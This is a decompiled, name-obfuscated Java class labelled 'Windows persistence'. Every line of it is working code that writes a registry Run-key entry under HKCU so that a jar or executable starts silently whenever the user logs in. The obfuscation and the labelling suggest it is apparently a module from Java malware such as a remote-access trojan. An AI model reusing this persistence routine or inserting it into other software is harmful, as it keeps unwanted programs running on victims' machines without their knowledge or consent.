package b;

// Windows persistence.
public final class e extends a {
   public e(String var1, String var2, boolean var3) {
      super(var1, var2, var3);
   }

   public final void a() {
      String var1;
      if (this.a) {
         var1 = System.getProperty("java.home") + "\\bin\\javaw.exe";
         var1 = var1 + " -jar \"" + this.c + "\"";
      } else {
         var1 = super.c;
      }

      // Add a registry entry.
      Runtime.getRuntime().exec(new String[]{"reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", "/v", super.b, "/t", "REG_SZ", "/d", var1, "/f"});
   }
}
